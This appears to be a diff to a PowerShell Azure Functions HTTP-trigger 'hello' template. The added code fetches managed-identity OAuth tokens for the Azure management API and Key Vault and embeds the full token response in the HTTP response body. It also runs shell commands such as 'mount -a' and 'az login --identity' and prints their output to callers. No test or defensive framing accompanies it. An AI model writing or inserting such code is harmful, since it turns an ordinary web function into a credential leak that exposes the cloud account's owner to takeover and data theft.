@@ -47,17 +47,31 @@ if (-not $name) {
 
 # http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
 # http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fdatalake.azure.net%2F
-$subid = $(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true)
+# $subid = $(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true)
 
 # $subid = (Get-AzSubscription).Id
 
 # http://0.0.0.0:7071/MSI/token?resource=https://vault.azure.net&api-version=2017-09-01
 
+$subid = $(curl 'http://0.0.0.0:7071/MSI/token?resource=https://vault.azure.net&api-version=2017-09-01' -H Metadata:true)
 
 
-$body = "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response. $subid"
+$resourceURI = "https://management.azure.com/"
+$tokenAuthURI = $env:IDENTITY_ENDPOINT + "?resource=$resourceURI&api-version=2019-08-01&client_id=2bb3ed0c-940c-4a3e-9d69-55304e765827"
+$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} -Uri $tokenAuthURI
+$accessToken = $tokenResponse.access_token
+
+$body = "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response. $tokenResponse. $subid............. $(echo $PATH) .......... ............. $(echo) .............. $(echo) ............ $(mount -a) ............. $(/home/.local/bin/az login --identity) ............ $(/home/.local/bin/az --version)"
+
+# $body = $tokenResponse
 
 # $body = "$(az vm list -o tsv)"
+
+# apt list --installed
+# dpkg --get-selections
+# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# pip install --no-dependencies azure-cli==2.40.0 && pip install azure-cli-core azure-common azure-mgmt-compute azure-mgmt-monitor azure-mgmt-resource semver
+
 
 if ($name) {
     $body = "Hello, $name. This HTTP triggered function executed successfully."
